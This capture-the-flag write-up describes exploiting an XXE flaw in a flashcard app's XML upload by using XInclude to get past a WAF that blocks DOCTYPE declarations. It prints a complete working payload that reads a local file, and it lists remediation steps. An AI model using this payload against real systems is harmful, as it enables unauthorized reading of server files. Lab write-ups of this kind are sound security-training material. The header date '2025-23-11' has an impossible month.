# Lab: XXE with DOCTYPE Filter Bypass via XInclude

- Date: 2025-23-11
- Platform: BugForge
- Difficulty: Easy - Medium
- Vulnerability: XML External Entity (XXE) Injection with WAF Bypass

## Lab Description
    This challenge involved exploiting an XXE vulnerability in a flashcard application that accepted both JSON and XML file uploads. The application implemented a WAF that blocked traditional XXE attacks by filtering DOCTYPE declarations.

## Key Steps
- Initial Reconnaissance: Discovered the application accepted XML uploads for flashcard decks
- Traditional XXE Failure: Standard DOCTYPE-based XXE payloads were blocked by WAF
- Filter Identification: Determined the application specifically blocked DOCTYPE declarations
- Bypass Technique: Used XInclude attacks which don't require DOCTYPE declarations
- Path Discovery: Tested multiple file paths to locate the flag

## Vulnerable Endpoint
```
POST /upload HTTP/1.1
Content-Type: multipart/form-data
```

## Exploitation Payload
```
<?xml version="1.0" encoding="UTF-8"?>
<deck xmlns:xi="http://www.w3.org/2001/XInclude">
  <name>
    <xi:include parse="text" href="file://flag.txt"/>
  </name>
  <description>A buuuuuuuds</description>
  <category>Example</category>
  <cards>
    <card>
      <front>What is the capital of France?</front>
      <back>Paris - the city of lights and capital of France since 987 AD.</back>
    </card>
    <card>
      <front>What programming language is this app built with?</front>
      <back>JavaScript - using Node.js for backend and React for frontend.</back>
    </card>
    <card>
      <front>What is a flashcard?</front>
      <back>A flashcard is a learning tool that presents information on both sides, typically a question on one side and an answer on the other.</back>
    </card>
    <card>
      <front>What does SRS stand for?</front>
      <back>Spaced Repetition System - a learning technique that uses increasing intervals of time between reviews of previously learned material.</back>
    </card>
    <card>
      <front>How do you create a custom deck?</front>
      <back>Download this sample file, edit the name, description, category, and cards array with your own content, then upload it using the Import Deck feature.</back>
    </card>
  </cards>
</deck>
```

## WAF Bypass Technique
- Traditional XXE Blocked: <!DOCTYPE> declarations were filtered
- XInclude Solution: Used xi:include with XML namespace to bypass DOCTYPE requirement
- Namespace Declaration: xmlns:xi="http://www.w3.org/2001/XInclude" essential for XInclude processing

## Technical Details
- Vulnerability: Unsafe XML processing with incomplete WAF protection
- Bypass Method: XInclude attacks circumvent DOCTYPE filters
- File Access: Direct file system access through file:// protocol
- Content Type: Required application/xml for proper processing

## Lesson Learned
- WAFs often focus on blocking DOCTYPE while missing XInclude attacks
- XInclude provides an effective XXE bypass when DOCTYPE is filtered
- Multiple file paths should be tested when the exact flag location is unknown
- Content-Type headers significantly impact XML processing behavior

## Remediation
- Disable all XML external entity processing
- Implement comprehensive XInclude filtering in addition to DOCTYPE blocking
- Use whitelist-based XML validation
- Consider using JSON instead of XML for data exchange

# Real-World Impact:
- XInclude-based XXE bypasses are commonly missed in web application firewalls and can lead to complete file system access despite DOCTYPE filtering, demonstrating the importance of comprehensive XML security measures.